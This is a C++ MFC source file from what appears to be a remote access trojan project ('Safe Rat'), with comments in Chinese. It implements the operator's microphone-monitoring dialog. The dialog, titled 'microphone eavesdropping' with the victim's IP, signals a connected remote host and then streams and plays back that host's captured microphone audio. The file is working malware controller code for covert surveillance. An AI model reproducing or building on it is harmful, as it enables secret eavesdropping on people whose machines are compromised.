// CMikeDlg.cpp: 实现文件
//

#include "pch.h"
#include "Safe Rat.h"
#include "CMikeDlg.h"
#include "afxdialogex.h"


// CMikeDlg 对话框

IMPLEMENT_DYNAMIC(CMikeDlg, CDialogEx)

CMikeDlg::CMikeDlg(CWnd* pParent, CHpTcpServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(IDD_MIKE_DLG, pParent)
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_MIKE));;
	m_bOnClose = FALSE;
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_nTotalRecvBytes = 0;

}

CMikeDlg::~CMikeDlg()
{
}

void CMikeDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CMikeDlg, CDialogEx)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CMikeDlg 消息处理程序


void CMikeDlg::OnClose()
{
	m_iocpServer->Disconnect(m_pContext);
	m_bOnClose = TRUE;
	CDialogEx::OnClose();
}

void CMikeDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;

	m_nTotalRecvBytes += m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;   //1000+ =1000 1
	CString	strString;
	strString.Format("Receive %d KBytes", m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_STATIC_M, strString);

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUDIO_DATA:
	{
		m_AudioObject.PlayBuffer(m_pContext->m_DeCompressionBuffer.GetBuffer(1),
			m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);   //播放波形数据
		break;
	}
	default:
		// 传输发生异常数据
		break;
	}
}


BOOL CMikeDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	//设置标题
	CString str;
	str.Format("%s - 麦克风监听", m_pContext->m_RemoteIP);
	SetWindowText(str);

	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}



void CMikeDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnClose();

	CDialogEx::PostNcDestroy();
	delete this;
}


BOOL CMikeDlg::PreTranslateMessage(MSG* pMsg)
{
	if (
		pMsg->message == WM_KEYDOWN		
		&&(	pMsg->wParam == VK_ESCAPE	 
		||	pMsg->wParam == VK_CANCEL	
		||	pMsg->wParam == VK_RETURN	
		))
		return TRUE;

	return CDialogEx::PreTranslateMessage(pMsg);
}
